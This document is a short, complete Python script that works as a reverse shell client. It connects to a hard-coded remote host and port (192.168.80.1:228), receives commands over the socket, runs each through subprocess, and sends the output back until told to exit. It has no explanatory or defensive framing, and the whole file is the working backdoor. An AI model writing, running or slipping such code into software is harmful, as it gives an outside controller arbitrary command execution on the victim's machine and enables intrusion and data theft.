import socket
import subprocess
import os

HOST = '192.168.80.1'
PORT = 228

def client() -> None:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))

    while True:
        command = s.recv(1024).decode()
        
        if command.lower() == 'exit':
            break
        
        if command.startswith('cd'):
            path2move = command.strip('cd ')
            if os.path.exists(path2move):
                os.chdir(path2move)
            else:
                s.send(('Cant change directory to'+path2move).encode())
            continue
            
        output = subprocess.getoutput(command)
        if (output):
            s.send(output.encode())
        else:
            s.send('Empty output'.encode())
        
    s.close()

if __name__ == '__main__':
    client()